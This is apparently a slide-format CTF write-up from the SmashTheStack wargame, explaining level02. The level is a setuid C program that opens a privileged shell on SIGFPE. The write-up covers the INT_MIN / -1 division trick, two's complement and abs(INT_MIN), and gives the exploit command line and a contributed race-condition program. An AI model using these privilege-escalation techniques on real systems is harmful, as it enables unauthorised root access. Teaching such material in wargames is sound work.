--title Explanation of level02
--author bla@smashthestack.org
--date today
--newpage
--center level02
--beginoutput
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <setjmp.h>

void catcher(int a)
{
        setresuid(geteuid(),geteuid(),geteuid());
        printf("WIN!\n");
        system("/bin/sh");
        exit(0);
}

int main(int argc, char **argv)
{
        puts("source code is available in level02.c\n");

        if (argc != 3 || !atoi(argv[2]))
                return 1;
        signal(SIGFPE, catcher);
        return abs(atoi(argv[1])) / atoi(argv[2]);	
}
--endoutput
--newpage
--title Explaining source
First we have a simple signal handler
--beginoutput
void catcher(int a)
{
        setresuid(geteuid(),geteuid(),geteuid());
        printf("WIN!\n");
        system("/bin/sh");
        exit(0);
}
--endoutput
Nothing much to say about that, we want to execute this because it will give us a shell with
elevated privileges. Some people wonder why it takes an int argument. It's nothing too juicy
glibc just sends the signal number in that variable. In our case that would be 8, as it's the
value of SIGFPE constant. Which you could discover by doing one of the following:
--beginoutput
man kill
grep SIGFPE /usr/src/linux/arch/x86/include/asm/signal.h
--endoutput
--newpage
--title main()
--beginoutput
int main(int argc, char **argv)
{
        puts("source code is available in level02.c\n");

        if (argc != 3 || !atoi(argv[2]))
                return 1;
        signal(SIGFPE, catcher);
        return abs(atoi(argv[1])) / atoi(argv[2]);
}
--endoutput

This is fairly straight forward as well. First we print out a message, since this is the first
level for which source code is provided, I want to make sure people don't waste their time
reversing the code. Happened to me a few times ^^.
--newpage
--title main(): continued
--beginoutput
if (argc!=3) return 1;
--endoutput
This requires argc==3, which means that 2 arguments need to be provided at the commandline.
The third argument is implicit and it's hidden. (namely argv[0] is the path to the 
binary. Not that you can't tinker with that ... as you will likely discover in a future level).
However for now it ensures that argv[1] and argv[2] exist. They are the strings "first" "second"
when the level is started as follows.
--beginoutput
$ ./level02 first second
--endoutput

--newpage
--title main() continued (2)
--beginoutput
!atoi(argv[2])
--endoutput
This checks wether the second argument provided at the commandline is not zero. After being
converted to an integer by the atoi() function. atoi stands for ASCII TO Integer. This is stdlib
function, nothing too surprising about it. Unfortunately
many people at first try to solve this level trying to bypass this check. However this should
not be possible.

--newpage
--title main() continued (3)
--beginoutput
signal(SIGFPE, catcher);
--endoutput

This probably requires a bit more of an explanation. Signals are used by the kernel to communicate
with user space. For example when you try to access memory the kernel will send your process a SIGSEGV
which by default will abort your program. However you could install a custom handler. And implement
something like the try{}catch from other languages. In this level however we only register a custom
signal handler for SIGFPE. Or Floating Point Exception. Which gets sent on a couple of arithmetic
problems. Like for example integer division by zero. It's important to know that this does not
yet call catcher(), all it does is register a handler, to be called when such a signal is received.

--newpage
--title main() continued (4)
--beginoutput
return abs(atoi(argv[1])) / atoi(argv[2]);
--endoutput

This simply converts the two arguments provided at the commandline and does an integer division.
Keep in mind that we previously checked that atoi(argv[2]) is not zero. So we can't do integer
division by zero.

There is however another situation where an integer division can generate a signal on x86.
And yes this is very platform specific. I even go as far as to call it a quirk. Perhaps
I should clarify, the hardware throws an exception (software interrupt), which the kernel
translates into this signal. 

--newpage
--title The simple solution
You could research or read the linux kernel source to find out that SIGFPE also gets sent when you
try to divide INT_MIN by -1. 
--beginoutput
/levels/level02 -2147483648 -1
--endoutput

Because of how atoi() works, it will even accept any negative number more negative than INT_MIN.
To clarify INT_MIN is the smallest value that can be represented in a 32bit integer.
--newpage
--title Why does it happen?
Well to properly explain the reason i should tell you a little story about 2's complement.
Two's complement is the method of encoding signed numbers. As we have all been told numerous
times. Everything is ones and zeros. When we want to store data in these ones and zeros we
have to agree on a convention, on what certain values mean. This is no different with signed
integers. we have 32 bit

0x00000000 -> 0xffffffff

There are numerous ways to map signed numbers to this range. However the method chosen
on x86 is 2's complement. This method has a lot of advantages. Only 1 zero, and not a 
+0 and -0. if bit 31 is 0 the number is positive, else it's negative. You can perform
additions with as if they were unsigned and it just works ...

The way to convert a positive number to a negative number in 2's complement is using
this formula
-x = (NOT x) + 1
--newpage
--title (NOT x) + 1

for example
--beginoutput
-1 = (NOT 1) + 1
   = (NOT 0x00000001) +1
   = 0xfffffffe +1
   = 0xffffffff
--endoutput

and hence also
--beginoutput
-1 + 1 = 0xffffffff + 0x0000001 = 0x00000000 
-0 = (NOT 0) +1
   = 0xffffffff +1
   = 0x00000000
--endoutput
Due to overflow.

--newpage
--title Range
This also has the consequence that there is one more negative number than there are positive numbers.
--beginoutput
zero: 0
positive numbers: 0x00000001 -> 0x7fffffff (1 -> 2147483647)
negative numbers: 0x80000000 -> 0xffffffff (-1 -> -2147483648)
--endoutput

So the solution of the level creates this calculation
--beginoutput
-2147483648 / -1 = 2147483648
--endoutput

The result of which 2147483648 can not be be represented in a 32bit 2's complement integer.

--newpage
--title Ooh it's just an overflow?

So is this just an integer overflow? Yes but it has a high quirk value too. because we all know that
--beginoutput
x / -1 = x * (1 / -1) = x * -1
--endoutput
So surely integer multiplication of INT_MIN with -1 should give the same result?
WRONG!

--beginoutput
-INT_MIN = (NOT INT_MIN) + 1
         = (NOT 0x80000000) + 1
         = 0x7ffffffff + 1
         = 0x800000000
         = INT_MIN
--endoutput
This also means that programs that check to see if the divider is not zero, often should also check
if this condition can't arise. Or defensive programming aside it can still crash.
--newpage
--title But what about abs()?

Let's take a look at how abs() is implemented in glibc:
--beginoutput
/* Return the absolute value of I.  */
int
abs (int i)
{
        return i < 0 ? -i : i;
}
--endoutput 
As you can see this function just checks if the number is smaller than 0 and if so, inverts its sign.

But what if i = INT_MIN? 
--beginoutput
abs(INT_MIN) = -INT_MIN
--endoutput
But as we saw in the previous slide:
--beginoutput 
INT_MIN = -INT_MIN
--endoutput 
As a result we have:
--beginoutput 
abs(INT_MIN) = -INT_MIN
             = INT_MIN
--endoutput 
As this example shows, it's not safe to assume that abs() will always return a positive value.

--newpage
--title Thanks wikipedia.
When this challenge was created SIGFPE page of wikipedia was not this helpful. I hope it didn't 
ruin it too much for you guys.
--newpage
--title The other solution
Actually it's probably as simple, however it requires a bit more knowledge of linux.
You can actually beat the race, and send the SIGFPE to the process yourself
LarsH contributes this solution
--beginoutput
#include <unistd.h>
#include <signal.h>
int main(int argc, char **argv) {
    int p=getpid();
    char *a[4] = {"/tmp/level02","1", "1", NULL};
 
    signal(SIGFPE, SIG_IGN);
 
    if(fork())  
        execve(a[0], a, NULL);

    for(;argc++;)
        kill(p, SIGFPE);
}
--endoutput
Which worked fine when the challenge was created, ... but doesn't at the moment
I'll try to figure out why soon.

--newpage
--title Thanks for listening

This is only a first draft. If you still have questions you can ask them on irc.
If you don't have questions you are still welcome!

--right bla

